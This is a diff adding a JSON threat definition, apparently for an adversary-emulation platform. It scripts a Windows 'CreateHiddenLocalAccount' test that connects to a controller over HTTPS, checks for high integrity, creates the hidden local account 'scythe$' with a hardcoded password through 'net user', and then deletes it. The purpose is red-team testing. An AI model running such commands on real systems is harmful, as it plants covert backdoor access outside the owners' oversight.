@@ -1,0 +1,85 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Compound Action to create a hidden local account.",
+        "display_name": "CreateHiddenLocalAccount",
+        "name": "CreateHiddenLocalAccount",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"192.168.2.50:443\",\"--secure\":true,\"--multipart\":10240}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "2": {
+                "function": "ifelse",
+                "next": "12",
+                "step": "1",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user scythe$",
+                "type": "message"
+            },
+            "5": {
+                "function": "ifelse",
+                "next": "7",
+                "step": "4",
+                "type": "decision",
+                "value": "The system cannot find the file specified.",
+                "verb": "contains"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user /del scythe$",
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user /add scythe$ Unicorns1!",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user scythe$",
+                "type": "message"
+            },
+            "10": {
+                "time": "6000",
+                "type": "delay"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user /del scythe$",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
